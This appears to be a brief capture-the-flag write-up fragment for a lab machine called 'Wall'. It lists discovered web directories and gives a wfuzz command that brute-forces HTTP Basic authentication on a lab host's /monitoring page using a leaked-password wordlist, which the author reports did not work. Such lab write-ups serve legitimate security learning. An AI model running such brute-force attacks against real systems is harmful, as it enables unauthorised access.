# Wall
## Something
> Directories found: monitoring, server-status, aa.php, panel.php

This can seem really confusing because there really doesn't seem to be anything to grasp on to.

> Bruteforcing, tried. With no results...
```
wfuzz --sc 301,200 -z file,darkweb2017-top10000.mod,base64 -H "Authorization: Basic FUZZ" http://10.10.10.157/monitoring
```
